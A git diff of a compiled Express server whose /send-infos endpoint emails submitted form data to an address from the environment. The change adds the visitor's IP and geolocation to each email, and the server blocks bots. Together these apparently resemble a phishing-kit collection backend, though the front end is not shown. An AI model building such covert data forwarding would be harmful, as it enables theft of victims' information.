@@ -15,6 +15,7 @@ Object.defineProperty(exports, "__esModule", { value: true });
 const express_1 = __importDefault(require("express"));
 const tableify_1 = __importDefault(require("tableify"));
 const express_nobots_1 = __importDefault(require("express-nobots"));
+const geoip_lite_1 = __importDefault(require("geoip-lite"));
 require("dotenv").config();
 const sendEmail_1 = require("./utils/sendEmail");
 const path_1 = __importDefault(require("path"));
@@ -23,9 +24,16 @@ const port = process.env.PORT || 5000;
 app.use(express_nobots_1.default());
 app.use(express_1.default.json());
 app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    const values = req.body;
-    yield sendEmail_1.sendEmail(process.env.EMAIL_ADDRESS, `${tableify_1.default([values])}`);
-    res.send(Promise.resolve());
+    try {
+        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+        const geo = geoip_lite_1.default.lookup(ip);
+        const values = req.body;
+        yield sendEmail_1.sendEmail(process.env.EMAIL_ADDRESS, `${tableify_1.default([values, Object.assign({ ip }, geo)])}`);
+        res.send(Promise.resolve());
+    }
+    catch (error) {
+        console.log(error);
+    }
 }));
 app.use(express_1.default.static(path_1.default.join(__dirname, "../build")));
 app.get("/*", (_, res) => {
